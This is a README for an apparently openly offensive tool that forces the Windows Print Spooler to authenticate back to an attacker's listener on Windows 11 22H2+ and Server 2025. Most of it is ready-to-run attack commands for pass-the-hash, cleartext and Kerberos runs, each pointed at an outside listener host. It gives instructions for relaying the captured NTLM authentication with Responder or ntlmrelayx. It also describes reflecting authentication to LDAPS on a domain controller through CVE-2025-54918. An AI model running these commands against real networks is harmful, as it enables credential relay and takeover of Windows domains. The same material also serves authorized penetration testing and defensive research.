# Pure RPC over TCP Printer Spooler Trigger
## For Windows 11 22H2+ / Windows Server 2025


## Usage
```
uv run --with impacket printerbugnew.py -t TARGET [-u USERNAME] [-p PASSWORD]
                                         [-H NTHASH] [-d DOMAIN] [-l LISTENER]
                                         [-k] [--ccache FILE] [--aes-key HEXKEY]
                                         [--dc-ip IP] [--port PORT]
```

| Flag | Description |
|------|-------------|
| `-t` | Target hostname or IP. Use FQDN with Kerberos for correct SPN resolution. |
| `-u` | Username |
| `-p` | Plaintext password |
| `-H` | NT hash for pass-the-hash |
| `-d` | Domain |
| `-l` | Listener IP/host for the backconnect (default: target) |
| `-k` | Use Kerberos authentication |
| `--ccache` | Path to ccache file — sets `KRB5CCNAME`, implies `-k` |
| `--aes-key` | AES128/256 key for Kerberos auth, implies `-k` (useful when RC4/NTLM is disabled) |
| `--dc-ip` | Domain controller / KDC IP |
| `--port` | Specific spoolss RPC/TCP port — omit to query EPM automatically |

## Examples

### Anonymous
```bash
uv run --with impacket printerbugnew.py -t 10.10.11.50 -l 10.10.14.5
```

### Cleartext credentials
```bash
uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -p ‘P@ssw0rd’ -d CORP -l 10.10.14.5
```

### Pass-the-hash
```bash
uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
```

### Kerberos with ccache
```bash
uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5
```

### Kerberos with AES key (RC4/NTLM disabled environments)
```bash
uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --aes-key 1d313c73ad2864ad8102776b891f0616bd3cf03ac459a7d6da2f4cce36dc94ec --dc-ip 10.10.11.1 -l 10.10.14.5
```

### Specific RPC port (skip EPM lookup)
```bash
uv run --with impacket printerbugnew.py -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
```

## Notes
- Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)
- For older versions, spoolss uses RPC over Named Pipes (SMB)
- Ensure ports 135 and dynamic RPC ports (49152-65535) are open
- Start Responder or ntlmrelayx on the listener host to capture auth
- The spooler uses a bad SPN when connecting back to the listener, forcing NTLM fallback — this is what makes it useful for relay attacks
- The EPM is queried automatically on TCP/135 for the RPRN interface UUID (`12345678-1234-abcd-ef00-0123456789ab`); use `--port` to skip the lookup
- Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
  <br><br>
  <img width="2019" height="657" alt="image" src="https://github.com/user-attachments/assets/84e8955e-c6ca-46de-abc8-b75829e259cc" />
<br><br>
  <img width="1555" height="844" alt="image" src="https://github.com/user-attachments/assets/3cecf90c-b581-4042-a487-6bb99e236475" />
<br><br>
<img width="548" height="332" alt="image" src="https://github.com/user-attachments/assets/84fe1c1b-4da2-4ce2-91c1-76e8c732b34f" /><br><br>
## Update for CVE-2025-54918
This exploit via reflection works only on W2025 with the "new" printerbug (DCERPC instead of Named Pipes). 
You’ll need to modify ntlmrelayx at a couple of points for it to work. After that, you can remotely trigger the printer bug on a W2025 DC and reflect authentication via LDAPS(!), even if Channel Bindings is **REQUIRED**<br>

ldaprelayclient.py:<br>
<img width="595" height="184" alt="image" src="https://github.com/user-attachments/assets/77b0bd49-13a7-4cd5-b701-0622fedb427f" /><br>
rpcrelayserver.py<br>
<img width="731" height="220" alt="image" src="https://github.com/user-attachments/assets/558d1bdc-bb28-455d-861b-83c6ac3afa46" />
<br><br>and relay ;)<br>
<img width="737" height="776" alt="image" src="https://github.com/user-attachments/assets/00780c4c-c016-4621-a3d7-8903476d8ad1" />

<br>

The vulnerability was fixed in September 2025 Patch Tuesday: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-54918<br>

The fix ensures that the MIC is **always** calculated, even when the Type 3 message is empty.<br>
<br>Thanks to the author of this CVE for a valuable hint :)


